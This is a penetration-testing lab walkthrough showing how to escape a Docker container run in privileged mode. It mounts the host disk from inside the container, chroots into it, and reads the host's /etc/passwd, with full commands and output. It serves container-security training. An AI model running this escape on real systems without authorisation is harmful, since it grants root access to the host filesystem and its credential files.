# Break out of a privileged docker container 

In this lab exercise we will run a container in a privileged mode and then breakout using chroot.

By default the containers are “unprivileged”. However, containers can be run in privileged mode by using ‘--privileged’ flag. 


* In this lab exercise we will run a container in a privileged mode and then breakout using chroot.

```bash
docker run -dit --privileged ubuntu:14.04 bash
```
Output:
```
pentester@NotSoSecure:~$ docker run -dit --privileged ubuntu:14.04 bash
Unable to find image 'ubuntu:14.04' locally
14.04: Pulling from library/ubuntu
2e6e20c8e2e6: Pull complete
0551a797c01d: Pull complete
512123a864da: Pull complete
Digest: sha256:d7a459ecd77ebb09525584f2c3e1bb7f6a2879d90df8a3523c1b899dfc2a226f
Status: Downloaded newer image for ubuntu:14.04
cdbf78ce2ab7f6914c79e785bb8c1bdc70da5c0606cca27ea63c0da2fd4cd178
```
* Run ```docker ps``` and obtain the container ID as shown below:
Output:
```
pentester@NotSoSecure:~$ docker ps
CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                       NAMES
cdbf78ce2ab7   ubuntu:14.04   "bash"                   4 seconds ago   Up 4 seconds                                               priceless_rhodes
```
* Login to the container by running ```docker exec -it <Container_ID> /bin/bash```
* Print the available capabilities in the docker container by running the command:  ```capsh --print ```
The container will print out all the capabilities as shown in Fig. Since the container has been run using the privileged mode the ```CAP_SYS_ADMIN ```capability is enabled. This capability allows us to run a vast set of system administrator tasks.

Output:
```
pentester@NotSoSecure:~$ docker exec -it cd /bin/bash
root@cdbf78ce2ab7:/# capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
root@cdbf78ce2ab7:/#
```
* Check for ‘/dev/sda1’ by running ```ls -la /dev/sda1 ```
Output:
```
root@cdbf78ce2ab7:/# ls -la /dev/sda1
brw-rw---- 1 root disk 8, 1 Sep  3 10:21 /dev/sda1
root@cdbf78ce2ab7:/#
```
* Mount this device to a mount point (in our case /mnt) by using the mount command:
```bash
mount /dev/sda1 /mnt
```
* List the files of the host system mounted above by running the command:  ```ls -l /mnt```
Output:
```
root@cdbf78ce2ab7:/# mount /dev/sda1 /mnt
root@cdbf78ce2ab7:/# ls -l /mnt
total 2097252
drwxr-xr-x  2 root root       4096 Mar 20 08:11 bin
drwxr-xr-x  3 root root       4096 Aug 26 09:57 boot
drwxr-xr-x  4 root root       4096 Mar 20 08:02 dev
drwxr-xr-x 93 root root       4096 Aug 26 10:17 etc
drwxr-xr-x  3 root root       4096 Mar 20 08:07 home
lrwxrwxrwx  1 root root         34 Mar 20 08:04 initrd.img -> boot/initrd.img-4.15.0-171-generic
lrwxrwxrwx  1 root root         34 Mar 20 08:04 initrd.img.old -> boot/initrd.img-4.15.0-171-generic
drwxr-xr-x 19 root root       4096 Aug 26 10:07 lib
drwxr-xr-x  2 root root       4096 Mar 20 08:05 lib64
drwx------  2 root root      16384 Mar 20 08:01 lost+found
drwxr-xr-x  2 root root       4096 Mar 20 08:13 media
drwxr-xr-x  2 root root       4096 Mar 20 08:02 mnt
drwxr-xr-x  4 root root       4096 Aug 26 10:07 opt
drwxr-xr-x  2 root root       4096 Apr 24  2018 proc
drwx------  3 root root       4096 Aug 26 10:18 root
drwxr-xr-x  2 root root       4096 Mar 20 08:07 run
drwxr-xr-x  2 root root       4096 Sep  1 16:10 sbin
drwxr-xr-x  2 root root       4096 Mar 20 08:02 srv
-rw-------  1 root root 2147483648 Mar 20 08:01 swapfile
drwxr-xr-x  2 root root       4096 Apr 24  2018 sys
drwxrwxrwt 12 root root       4096 Sep  3 10:23 tmp
drwxr-xr-x 10 root root       4096 Mar 20 08:02 usr
drwxr-xr-x  2 root root       4096 Aug 26 09:57 vagrant
drwxr-xr-x 11 root root       4096 Mar 20 08:02 var
lrwxrwxrwx  1 root root         31 Mar 20 08:04 vmlinuz -> boot/vmlinuz-4.15.0-171-generic
lrwxrwxrwx  1 root root         31 Mar 20 08:04 vmlinuz.old -> boot/vmlinuz-4.15.0-171-generic
root@cdbf78ce2ab7:/#
```
* We have now successfully mounted the device /dev/sda1 and gained access to the host’s filesystem. Now Chroot into the host by running the below command:  
```bash
chroot /mnt bash
```
Then run ```cat /etc/passwd```
Output:
```
root@cdbf78ce2ab7:/# chroot /mnt bash
root@cdbf78ce2ab7:/# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
pentester:x:1000:1000:pentester,,,:/home/pentester:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
ntp:x:108:114::/nonexistent:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

